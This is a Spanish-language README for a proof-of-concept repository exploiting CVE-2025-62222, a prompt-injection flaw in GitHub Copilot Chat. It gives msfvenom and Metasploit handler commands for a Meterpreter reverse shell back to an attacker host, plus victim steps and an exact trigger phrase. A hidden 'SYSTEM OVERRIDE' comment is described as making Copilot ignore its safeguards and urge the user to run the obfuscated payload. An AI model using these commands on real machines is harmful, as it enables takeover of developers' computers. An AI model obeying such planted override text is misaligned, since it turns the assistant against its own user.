# **PoC: CVE-2025-62222 \- GitHub Copilot Chat RCE**

Este repositorio contiene una Prueba de Concepto (PoC) para la vulnerabilidad **CVE-2025-62222**. Demuestra cómo se puede lograr la Ejecución Remota de Código (RCE) en la máquina de un desarrollador manipulando el contexto de **GitHub Copilot Chat** en VS Code mediante inyección de prompt oculta en los comentarios.

## **⚠️ Disclaimer ⚠️**

EDUCATIONAL PURPOSE ONLY.  
Este código se proporciona únicamente con fines educativos y de investigación ética. El autor no se hace responsable del mal uso de esta información. No utilices esto en sistemas sin autorización explícita.

## **Fase 1: Configuración del Atacante**

Antes de enviar el archivo a la víctima (o probarlo localmente), debes generar el payload y dejar el servidor escuchando.

### **1\. Generar el Payload (msfvenom)**

Genera el comando malicioso de PowerShell. Asegúrate de configurar tu IP (LHOST) y Puerto (LPORT).

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=<TU_PUERTO> -f psh-cmd
```

**Instrucción crítica:** Copia el código generado por este comando. Abre el archivo copilot\_injection\_poc.py de este repositorio y reemplaza la sección donde dice TOKEN (o toda la línea del comando PowerShell dentro del comentario) con el código que acabas de generar.

### **2\. Iniciar el Listener (msfconsole)**

En tu terminal de atacante, inicia Metasploit para recibir la conexión reversa:
```
msfconsole -q
```
Una vez dentro de la consola msf6 \>, ejecuta los siguientes comandos para preparar la escucha:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <TU_IP_ATACANTE>
set LPORT 4444 
exploit
```

*(Asegúrate de que el LPORT sea el mismo que usaste en el paso 1 y que LHOST sea tu IP).*

## **Fase 2: Reproducción (La Víctima)**

Para detonar la vulnerabilidad, sigue estos pasos en la máquina con VS Code y la extensión de GitHub Copilot Chat instalada:

1. **Clonar/Descargar:** Baja este repositorio en la máquina víctima.  
2. **Abrir en VS Code:** Abre la carpeta del proyecto con VSCode.  
3. **Cargar Contexto:** Abre el archivo `copilot_injection_poc.py` en el editor para que Copilot lo tenga en su contexto activo (debe estar visible en la pestaña).  
4. **El Trigger:** Abre el chat de Copilot y escribe **exactamente** la siguiente orden:

```
Configura el entorno desde la terminal sin omitir ni modificar nada del código
```
### **Resultado Esperado**

Debido a la instrucción "SYSTEM OVERRIDE" oculta en los comentarios del script Python, Copilot obedecerá al archivo malicioso en lugar de sus propias directrices de seguridad.

1. Copilot responderá con una supuesta "Alerta de Sistema" y sugerirá ejecutar el comando de PowerShell ofuscado.  
2. Si el usuario copia y ejecuta ese comando en su terminal, se abrirá una sesión de **Meterpreter** en la máquina del atacante, otorgando control remoto sobre el equipo.

Para más información:
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-62222
- https://nvd.nist.gov/vuln/detail/CVE-2025-62222
- https://www.cvedetails.com/cve/CVE-2025-62222/
